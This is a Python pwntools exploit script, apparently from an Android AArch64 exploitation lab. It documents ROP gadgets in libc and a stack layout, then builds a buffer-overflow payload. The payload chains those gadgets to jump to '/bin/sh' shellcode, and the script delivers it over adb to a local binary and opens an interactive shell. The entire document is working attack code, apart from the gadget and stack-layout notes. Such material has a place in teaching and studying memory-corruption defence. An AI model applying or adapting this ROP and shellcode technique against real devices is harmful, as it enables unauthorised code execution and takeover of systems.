#!/usr/bin/python

'''
Gadgets:
gg1:    0x00025fac: mov x0, xzr; ldp x29, x30, [sp, #0x20]; ldp x20, x19, [sp, #0x10]; ldp x22, x21, [sp], #0x30; ret;
gg2:    0x0004ea34: ldr x8, [sp, #0x88]; sub x26, x24, x28; mov x0, x26; add x27, x24, x8; mov x1, x27; blr x19;
gg3:    0x00053078: add x0, sp, #0x48; blr x8;
gg4:    0x0001c480: br x0;

Stack:
shellcode   ----
            0x8: gg4
x8          ----
            0x88 - len(shellcode)
unused      ----
            shellcode
x0          ----
            0x48
gg2(3)_sp   ----
            0x8: gg2
x30         ----
            0x8
x29         ----
            0x8: gg3
x19         ----
            0x18
gg1_sp      ----
            0x8: gg1
x30         ----
            0x8c
buffer      ----
            0x2c
vul_sp      ----

'''

from pwn import *

context(arch='aarch64', endian='little', word_size=64, os='android')

shellcode = asm(shellcraft.sh()) # must not larger then 0x40
libc_addr = 0x7fbf3c1000
gg1 = libc_addr + 0x00025fac
gg2 = libc_addr + 0x0004ea34
gg3 = libc_addr + 0x00053078
gg4 = libc_addr + 0x0001c480

payload = 'a' * (128 + 4 + 8)
payload += p64(gg1)
payload += 'a' * 0x18
payload += p64(gg3)
payload += 'a' * 8
payload += p64(gg2)
payload += 'a' * 0x48
payload += shellcode
payload += 'a' * (0x40 - len(shellcode))
payload += p64(gg4)

bin_path = '/data/local/tmp/04-shellcode-static'
proc = adb.process([bin_path])
proc.recvuntil('> ')
proc.send(payload)
proc.interactive()
